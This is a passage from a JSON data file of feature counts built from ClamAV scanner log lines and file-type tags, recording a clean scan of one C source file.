                "clamav: [Bytecode JIT]; emitted ELF64-x86-64 <in-memory object> of 1????? bytes;clamav: Bytecode: 94 bytecode prepared with JIT": 1,
                "clamav: Bytecode: 94 bytecode prepared with JIT;clamav: Recognized ASCII text": 1,
                "clamav: Recognized ASCII text;clamav: cli_magic_scandesc: returning 0  at line 2???": 1,
                "clamav: cli_magic_scandesc: returning 0  at line 2???;clamav: malware family: OK": 1,
                "clamav: malware family: OK;clamav: OK": 1,
                "clamav: OK;clamav: Scanned files: 1": 1,
                "clamav: Scanned files: 1;clamav: Infected files: 0": 1,
                "clamav: Infected files: 0;clamav: extracted blobs": 1,
                "clamav: extracted blobs;clamav: extracted 1 blobs": 1,
                "clamav: extracted 1 blobs;clamav: blob size: 8???": 1,
                "File type: C source, ASCII text": 1,
                "File type segment: C source": 1,
                "File type word: C": 1,
                "File type word: source": 1,
                "File type segment:  ASCII text": 1,
                "File type word: ASCII": 1,
                "File type word: text": 1,
                "Extracted blob: C source, ASCII text, with very long lines, with no line terminators": 1,
                "blob file types: C": 1
            }
        }
    ]
}